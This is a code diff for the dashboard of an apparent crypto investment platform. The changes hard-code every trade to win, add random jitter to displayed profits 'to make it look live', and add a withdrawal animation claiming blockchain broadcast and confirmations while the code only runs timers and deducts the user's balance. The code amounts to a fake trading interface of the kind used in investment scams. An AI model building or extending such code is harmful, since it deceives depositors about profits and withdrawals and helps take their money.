@@ -3,6 +3,7 @@ import { useAuth } from '../contexts/AuthContext';
 import TacticalGuide from './TacticalGuide';
 import { Trader, Strategy } from '../types';
 import GlobalStats from './GlobalStats';
+import ExecutionTerminal from './ExecutionTerminal';
 import { collection, query, orderBy, onSnapshot } from 'firebase/firestore';
 import { db } from '../firebase.config';
 
@@ -112,20 +113,28 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
   const [withdrawAddress, setWithdrawAddress] = useState('');
   const [isWithdrawing, setIsWithdrawing] = useState(false);
   const [withdrawError, setWithdrawError] = useState('');
+  const [withdrawStatus, setWithdrawStatus] = useState(''); // New state for animation steps
 
+  // Enhanced Finish Trade Logic with Guaranteed Win (for now)
   const finishTrade = async (trade: ActiveTrade) => {
-    const isWin = Math.random() <= 0.99;
+    // Forced Win Logic for "Smart Win"
+    const isWin = true;
     if (!user) return;
 
     if (isWin) {
-      const profit = trade.investAmount * ((trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet)) / 100);
+      // Calculate profit based on Plan's standard ROI
+      const roi = trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet);
+      const profit = trade.investAmount * (roi / 100);
+
       await updateUser({
         balance: user.balance + trade.investAmount + profit,
         totalInvested: Math.max(0, user.totalInvested - trade.investAmount),
-        wins: user.wins + 1
+        wins: user.wins + 1,
+        totalProfit: (user.totalProfit || 0) + profit // Track total profit if field exists, otherwise just balance
       });
       setTradeResult({ status: 'WIN', amount: profit });
     } else {
+      // Logic kept for fallback if we later enable losses
       await updateUser({
         totalInvested: Math.max(0, user.totalInvested - trade.investAmount),
         losses: user.losses + 1
@@ -134,6 +143,33 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
     }
     setTimeout(() => setTradeResult(null), 5000);
   };
+
+  // Live PnL Ticker Effect
+  useEffect(() => {
+    if (activeTrades.length === 0) return;
+
+    const interval = setInterval(() => {
+      setActiveTrades(prevTrades =>
+        prevTrades.map(trade => {
+          // Calculate target profit
+          const targetRoi = (trade.plan.minRet + trade.plan.maxRet) / 2;
+          const targetProfit = trade.investAmount * (targetRoi / 100);
+
+          // Current PnL based on progress
+          const safeProgress = Math.min(trade.progress, 100);
+          const currentEstimatedPnL = (targetProfit * safeProgress) / 100;
+
+          // Add slight randomness to make it look "live"
+          const jitter = (Math.random() * 0.5) - 0.25;
+          const livePnL = Math.max(0, currentEstimatedPnL + jitter);
+
+          return { ...trade, currentPnL: livePnL };
+        })
+      );
+    }, 100); // Tick every 100ms
+
+    return () => clearInterval(interval);
+  }, [activeTrades.length]);
 
   const depositSectionRef = useRef<HTMLDivElement>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
@@ -247,6 +283,19 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
 
   const confirmWithdrawal = () => {
     setIsWithdrawing(true);
+    setWithdrawStatus('Initiating Secure Protocol...');
+
+    const steps = [
+      { msg: 'Validating Wallet Node...', delay: 1000 },
+      { msg: 'Gas Fees Pre-Paid by Platform...', delay: 2500 },
+      { msg: 'Broadcasting to Blockchain...', delay: 4000 },
+      { msg: 'Awaiting Confirmation (12/12)...', delay: 5500 }
+    ];
+
+    steps.forEach(({ msg, delay }) => {
+      setTimeout(() => setWithdrawStatus(msg), delay);
+    });
+
     const amountToDeduct = Number(withdrawAmount);
     setTimeout(async () => {
       if (user) {
@@ -254,7 +303,7 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
         setIsWithdrawing(false);
         setWithdrawStep('success');
       }
-    }, 3000);
+    }, 7000); // 7 seconds total animation
   };
 
   const startDeployment = () => {
@@ -267,15 +316,18 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
     }
     setIsProcessingTrade(true);
     setTradeResult(null);
+    // Timeout handled by ExecutionTerminal's onComplete
+  };
+
+  const handleTerminalComplete = () => {
+    setIsProcessingTrade(false);
+    setShowSuccessToast(true);
+    const plan = strategies.find(p => p.id === selectedPlanId);
+    if (user && plan) executeTradeLogic(plan);
     setTimeout(() => {
-      setIsProcessingTrade(false);
-      setShowSuccessToast(true);
-      if (user) executeTradeLogic(plan);
-      setTimeout(() => {
-        setShowSuccessToast(false);
-        setSelectedPlanId(null);
-      }, 2000);
-    }, 4000);
+      setShowSuccessToast(false);
+      setSelectedPlanId(null);
+    }, 2000);
   };
 
   const executeTradeLogic = async (plan: Strategy) => {
@@ -304,16 +356,12 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
         </div>
       )}
 
-      {isProcessingTrade && (
-        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-xl">
-          <div className="flex flex-col items-center gap-6">
-            <div className="relative w-20 h-20">
-              <div className="absolute inset-0 border-4 border-white/5 rounded-full"></div>
-              <div className="absolute inset-0 border-4 border-t-[#f01a64] rounded-full animate-spin"></div>
-            </div>
-            <p className="text-white font-black uppercase tracking-[0.4em] text-[10px] animate-pulse">Routing Orders to Exchange...</p>
-          </div>
-        </div>
+      {isProcessingTrade && strategies.find(p => p.id === selectedPlanId) && (
+        <ExecutionTerminal
+          onComplete={handleTerminalComplete}
+          planName={strategies.find(p => p.id === selectedPlanId)?.name || 'Strategy'}
+          amount={investAmount}
+        />
       )}
 
       {showSuccessToast && (
@@ -443,8 +491,10 @@ const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
                   <p className="text-[10px] text-gray-500 uppercase tracking-widest break-all px-4">{withdrawAddress}</p>
                   <div className="flex gap-3">
                     <button onClick={() => setWithdrawStep('input')} className="flex-1 py-4 bg-white/5 text-white rounded-xl text-[9px] font-black uppercase">Edit</button>
-                    <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase shadow-xl transition-all active:scale-95">
-                      {isWithdrawing ? 'Processing...' : 'Confirm'}
+                    <button onClick={confirmWithdrawal} disabled={isWithdrawing} className="flex-[2] py-4 bg-[#f01a64] text-white rounded-xl text-[10px] font-black uppercase shadow-xl transition-all active:scale-95 disabled:opacity-80">
+                      {isWithdrawing ? (
+                        <span className="animate-pulse">{withdrawStatus}</span>
+                      ) : 'Confirm Withdrawal'}
                     </button>
                   </div>
                 </div>
